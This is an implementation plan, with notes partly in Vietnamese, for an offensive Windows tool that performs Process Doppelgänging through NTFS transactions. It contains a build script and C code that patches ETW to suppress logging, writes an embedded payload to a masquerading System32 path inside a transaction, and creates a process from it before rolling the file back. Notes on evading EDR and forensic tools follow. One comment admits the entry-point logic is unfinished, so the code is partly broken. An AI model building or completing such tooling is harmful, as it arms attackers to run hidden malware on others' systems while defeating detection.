# Plan 2 — PE Injection: Implementation Plan

> **Target**: T1055.002 | **Technique**: Process Doppelgänging (TxF) | **Pre-condition**: SYSTEM/Admin

---

## 0. Project Structure

```
Process_Injection/
├── shared/
│   ├── common.h              ← Shared types, NT API, crypto declarations
│   ├── syscall_resolver.c    ← Indirect syscall resolution + wrappers
│   ├── sha256.c              ← SHA-256 hash
│   ├── aes256_gcm.c          ← AES-256-CTR + SHA-256 tag
│   └── ads_writer.c          ← AES-256-GCM encrypt + ADS output
├── Plan1_DLL_Injection/
│   └── ...
└── Plan2_PE_Injection/
    ├── main.c                ← Process Doppelgänging via NTFS Transaction
    ├── build.bat             ← MSVC build script
    ├── README.md             ← Setup & run guide
    └── test/
        ├── run_test.ps1
        └── detect_check.ps1
```

---

## 1. Build

```batch
@echo off
REM build.bat — Plan 2 PE Injection (Process Doppelgänging)
call "C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat"

set CFLAGS=/nologo /O2 /MT /GS- /GL /W3 /WX- /Z7 ^
           /D "WIN32_LEAN_AND_MEAN" /D "NDEBUG" /D "_CONSOLE"

cl.exe %CFLAGS% /Fe"PEInjection.exe" ^
    main.c ^
    ..\shared\syscall_resolver.c ^
    ..\shared\sha256.c ^
    ..\shared\aes256_gcm.c ^
    ..\shared\ads_writer.c ^
    /link /NOLOGO /OPT:REF /OPT:ICF /DYNAMICBASE /NXCOMPAT ^
    kernel32.lib ntdll.lib advapi32.lib crypt32.lib

echo Build complete: PEInjection.exe
```

---

## 2. Core Implementation

### 2.1 Attack Chain (single main.c)

```c
// Plan 2 — Process Doppelgänging via NTFS Transaction (T1055.002)
// Flow: Init syscalls → ETW patch → Create TxF transaction
//       → Ghost file write → SEC_IMAGE section → Create process
//       → Rollback transaction → Create thread → Execute
#include "../shared/common.h"

// ─── Minimal PE payload (embedded, x86-64) ───
// This is a complete valid PE file (~4KB) with:
//   - DOS header + stub
//   - NT headers (64-bit)
//   - Single .text section (PIC entry point)
//   - Entry: PEB walk → resolve APIs → ADS write → ExitProcess
static BYTE g_PEPayload[] = { /* ... PE bytes ... */ };

// ─── ETW Patch ───
static BOOL PatchEtw(void) {
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    PBYTE p = (PBYTE)GetProcAddress(ntdll, "EtwEventWrite");
    if (!p) return FALSE;
    DWORD old;
    VirtualProtect(p, 3, PAGE_EXECUTE_READWRITE, &old);
    p[0]=0x33; p[1]=0xC0; p[2]=0xC3;
    VirtualProtect(p, 3, old, &old);
    return TRUE;
}

// ─── Main ───
int wmain(void) {
    wprintf(L"[*] PE Injection — Process Doppelgänging (TxF)\n");

    // 1. Resolve indirect syscalls
    wprintf(L"[1] Resolving syscalls from disk ntdll... ");
    InitSyscallResolver(); wprintf(L"OK\n");

    // 2. Patch ETW
    wprintf(L"[2] Patching ETW... ");
    PatchEtw(); wprintf(L"OK\n");

    // 3. Build ghost file path (legitimate-looking)
    WCHAR ghostPath[MAX_PATH];
    GetSystemDirectoryW(ghostPath, MAX_PATH);
    wcscat_s(ghostPath, MAX_PATH, L"\\Tasks.dll");  // masquerading

    // 4. Create NTFS transaction
    wprintf(L"[3] Creating NTFS transaction... ");
    HANDLE hTx;
    NTSTATUS st = SysNtCreateTransaction(&hTx, TRANSACTION_ALL_ACCESS, NULL, NULL, NULL, 0, 0, 0, NULL);
    wprintf(L"%s (0x%08X)\n", NT_SUCCESS(st)?L"OK":L"FAIL", st);

    // 5. Create ghost file in transaction
    wprintf(L"[4] Creating ghost file: %s... ", ghostPath);
    UNICODE_STRING pathUs;
    RtlInitUnicodeString(&pathUs, ghostPath);
    OBJECT_ATTRIBUTES oa = { sizeof(oa), NULL, &pathUs, OBJ_CASE_INSENSITIVE, NULL, NULL };
    IO_STATUS_BLOCK iosb;

    HANDLE hFile;
    st = SysNtCreateFile(&hFile, GENERIC_WRITE | GENERIC_READ, &oa, &iosb, NULL,
        FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_OVERWRITE_IF,
        FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE, NULL, 0, hTx);
    wprintf(L"%s\n", NT_SUCCESS(st)?L"OK":L"FAIL");

    // 6. Write PE payload
    wprintf(L"[5] Writing PE payload (%d bytes)... ", (DWORD)sizeof(g_PEPayload));
    st = SysNtWriteFile(hFile, NULL, NULL, NULL, &iosb,
        g_PEPayload, sizeof(g_PEPayload), NULL, NULL);
    wprintf(L"%s\n", NT_SUCCESS(st)?L"OK":L"FAIL");

    // 7. Create SEC_IMAGE section
    wprintf(L"[6] Creating SEC_IMAGE section... ");
    HANDLE hSec;
    st = SysNtCreateSection(&hSec, SECTION_ALL_ACCESS, NULL, NULL, PAGE_READONLY, SEC_IMAGE, hFile);
    SysNtClose(hFile);
    wprintf(L"%s\n", NT_SUCCESS(st)?L"OK":L"FAIL");

    // 8. Create process from section
    wprintf(L"[7] Creating process from ghost image... ");
    HANDLE hProc;
    st = SysNtCreateProcessEx(&hProc, PROCESS_ALL_ACCESS, NULL, NtCurrentProcess(),
        PROCESS_CREATE_FLAGS_CREATE_SUSPENDED, hSec, NULL, NULL, 0);
    wprintf(L"%s\n", NT_SUCCESS(st)?L"OK":L"FAIL");

    // 9. Rollback transaction → file vanishes
    wprintf(L"[8] Rolling back transaction... ");
    SysNtRollbackTransaction(hTx, TRUE);
    SysNtClose(hTx);
    wprintf(L"OK (file never existed)\n");

    // 10. Create thread + execute
    wprintf(L"[9] Starting process execution... ");
    // Resolve entry point from PE headers in memory
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)g_PEPayload;
    PIMAGE_NT_HEADERS64 nt = (PIMAGE_NT_HEADERS64)(g_PEPayload + dos->e_lfanew);
    PVOID entry = (PVOID)((ULONG_PTR)nt->OptionalHeader.ImageBase +
                          nt->OptionalHeader.AddressOfEntryPoint);
    // Actually need to find where kernel mapped it — use PEB query

    HANDLE hThread;
    st = SysNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProc,
        entry, NULL, 0, 0, 0, NULL);
    wprintf(L"%s\n", NT_SUCCESS(st)?L"OK":L"FAIL");

    // 11. Verify
    wprintf(L"[10] Payload running in PID=... verify ADS for result\n");

    // Cleanup
    SysNtClose(hSec); SysNtClose(hProc);
    if (hThread) SysNtClose(hThread);

    wprintf(L"[+] Process Doppelgänging complete\n");
    wprintf(L"[+] File %s does not exist on disk\n", ghostPath);
    return 0;
}
```

---

## 3. Key Technical Notes

### NTFS Transaction (TxF) Mechanics
- Transaction tạo isolation scope: mọi thay đổi file system trong transaction chỉ visible trong scope đó
- File được tạo trong transaction có MFT entry tạm thời — không có directory entry thực sự cho đến khi commit
- `NtRollbackTransaction` → mọi thay đổi bị hủy → MFT entry bị xóa, clusters được giải phóng
- Kernel PE loader (trong `NtCreateSection(SEC_IMAGE)`) chỉ cần file handle — không cần file tồn tại trên disk sau đó

### Why SEC_IMAGE Matters
- `SEC_IMAGE` báo cho kernel: "hãy parse file này như PE image"
- Kernel tự động: validate PE headers, map sections đúng protection, xử lý relocations
- Process memory sẽ có type `Image` (không phải `Private`) → EDR memory scan thường skip Image regions
- Không cần manual PE loading (tránh reflective loader overhead)

### Ghost File Masquerading
- File path: `C:\Windows\System32\Tasks.dll` — trông như legitimate Windows component
- `PsSetCreateProcessNotifyRoutineEx` nhận path này → không suspicious
- Process properties trong Task Manager: `Tasks.dll` — không rõ ràng là malware

### Detection Blind Spots
- TxF là deprecated API (từ Windows Vista) nhưng vẫn functional — ít EDR monitor
- File chưa bao giờ commit → forensic tools (FTK Imager, KAPE) không thấy file
- USN Journal không có entry cho file (chưa commit)
- $LogFile có thể có dấu vết transaction — nhưng ít tool parse được TxF logs
